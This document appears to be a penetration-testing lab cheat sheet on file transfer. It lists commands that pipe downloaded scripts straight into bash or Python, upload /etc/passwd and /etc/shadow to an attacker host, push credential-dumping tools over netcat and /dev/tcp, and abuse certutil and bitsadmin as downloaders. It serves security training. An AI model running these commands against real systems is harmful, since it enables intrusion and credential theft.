# OPEN SERVER:
## PYTHON:

# WGET
- `python3 -m http.server 1234` local machine

- `wget http://10.10.14.1:8000/linenum.sh` target machine
- `curl http://10.10.14.1:8000/linenum.sh -o` linenum.sh

# SCP
- `scp linenum.sh user@remotehost:/tmp/linenum.sh` local machine

# Base64
## Encode SSH Key to Base64
- `cat id_rsa |base64 -w 0;echo`

## Decode the File
- `echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`

# Web Downloads with Wget and cURL
## Download a File Using wget
- `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`

## Download a File Using cURL
- `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`

# Fileless Attacks Using Linux
## Fileless Download with cURL
- `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`

## Fileless Download with wget
- `wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`

# Download with Bash (/dev/tcp)
## Connect to the Target Webserver
- `exec 3<>/dev/tcp/10.10.10.32/80`

## HTTP GET Request
- `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`

## Print the Response
- `cat <&3`

# SSH Downloads
## Enabling the SSH Server
- `sudo systemctl enable ssh`

## Starting the SSH Server
- `sudo systemctl start ssh`

## Checking for SSH Listening Port
- ` netstat -lnpt`

## Linux - Downloading Files Using SCP
- `scp plaintext@192.168.49.128:/root/myroot.txt . `

`Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.`

# Upload Operations
## Web Upload
### Pwnbox - Start Web Server
- `sudo python3 -m pip install --user uploadserver`

### Pwnbox - Create a Self-Signed Certificate
- `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
`The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.`

### Pwnbox - Start Web Server
- `mkdir https && cd https`
- `sudo python3 -m uploadserver 443 --server-certificate /root/server.pem`

### Linux - Upload Multiple Files
- `curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`

# Alternative Web File Transfer Method
## Linux - Creating a Web Server with Python3
- `python3 -m http.server`

## Linux - Creating a Web Server with Python2.7
- `python2.7 -m SimpleHTTPServer`

## Linux - Creating a Web Server with PHP
- `php -S 0.0.0.0:8000`

## Linux - Creating a Web Server with Ruby
- `ruby -run -ehttpd . -p8000`

## Download the File from the Target Machine onto the Pwnbox
- `wget 192.168.49.128:8000/filetotransfer.txt`

# SCP Upload
## File Upload using SCP
- `scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/`

# Transferring Files with Code
## Python
### Python 2 - Download
- `python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`

### Python 3 - Download
- `python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`

## PHP
### PHP Download with File_get_contents()
- `php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`

### PHP Download with Fopen()
- `php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`

### PHP Download a File and Pipe it to Bash
- `php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`

## Other Languages
### Ruby - Download a File
- `ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`

### Perl - Download a File
- `perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'`

# Upload Operations using Python3
## Starting the Python uploadserver Module
- `python3 -m uploadserver `

## Uploading a File Using a Python One-liner
- `python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'`

# Miscellaneous File Transfer Methods
## Netcat
### NetCat - Compromised Machine - Listening on Port 8000
- `nc -l -p 8000 > SharpKatz.exe`

### Ncat - Compromised Machine - Listening on Port 8000
- `ncat -l -p 8000 --recv-only > SharpKatz.exe`

### Netcat - Attack Host - Sending File to Compromised machine
- `nc -q 0 192.168.49.128 8000 < SharpKatz.exe`

### Ncat - Attack Host - Sending File to Compromised machine
- `ncat --send-only 192.168.49.128 8000 < SharpKatz.exe`

### Attack Host - Sending File as Input to Netcat
- `sudo nc -l -p 443 -q 0 < SharpKatz.exe`

### Compromised Machine Connect to Netcat to Receive the File
- `nc 192.168.49.128 443 > SharpKatz.exe`

### Attack Host - Sending File as Input to Ncat
- `sudo ncat -l -p 443 --send-only < SharpKatz.exe`

### Compromised Machine Connect to Ncat to Receive the File
- `ncat 192.168.49.128 443 --recv-only > SharpKatz.exe`

### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
- `cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe`

# Protected File Transfers
## File Encryption on Linux
### Encrypting /etc/passwd with openssl
- `openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc`

### Decrypt passwd.enc with openssl
- `openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd`
# Catching Files over HTTP/S
## Nginx - Enabling PUT
### Create a Directory to Handle Uploaded Files
- `sudo mkdir -p /var/www/uploads/SecretUploadDirectory`

### Change the Owner to www-data
- `sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory`

### Create Nginx Configuration File
Create the Nginx configuration file by creating the file /etc/nginx/sites-available/upload.conf with the contents:
```
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

### Symlink our Site to the sites-enabled Directory
- `sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/`

### Start Nginx
- `sudo systemctl restart nginx.service`

### Upload File Using cURL
- `curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt`

- `tail -1 /var/www/uploads/SecretUploadDirectory/users.txt `

# Living off The Land
## Create Certificate in our Pwnbox
- `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem`

## Stand up the Server in our Pwnbox
- `openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh`

## Download File from the Compromised Machine
- `openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh`

## Other Common Living off the Land tools
### File Download with Bitsadmin
- `bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe`

### Download
- `Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"`

### Certutil
#### Download a File with Certutil
- `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`
